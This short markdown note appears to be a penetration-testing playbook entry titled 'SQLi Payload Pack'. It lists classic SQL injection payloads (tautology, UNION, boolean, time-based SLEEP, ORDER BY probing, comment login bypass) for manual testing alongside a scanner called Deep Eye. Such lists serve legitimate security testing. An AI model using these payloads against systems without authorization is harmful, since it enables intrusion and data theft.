# SQLi Payload Pack

**Trigger condition:** Manual SQLi testing after Deep Eye hit or WAF block.

## Overview
Representative SQLi payloads by technique. Use with Deep Eye multi-surface inject.

## Key Payloads
```
' OR '1'='1
' OR '1'='1' --
' UNION SELECT NULL--
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
1' ORDER BY 10--
admin'--
```

## Tools Available
| Tool | Command | Purpose |
|------|---------|---------|
| Deep Eye | `sql_injection` check | Auto |
| AI payloads | `payload_generation.use_ai` | Context variants |
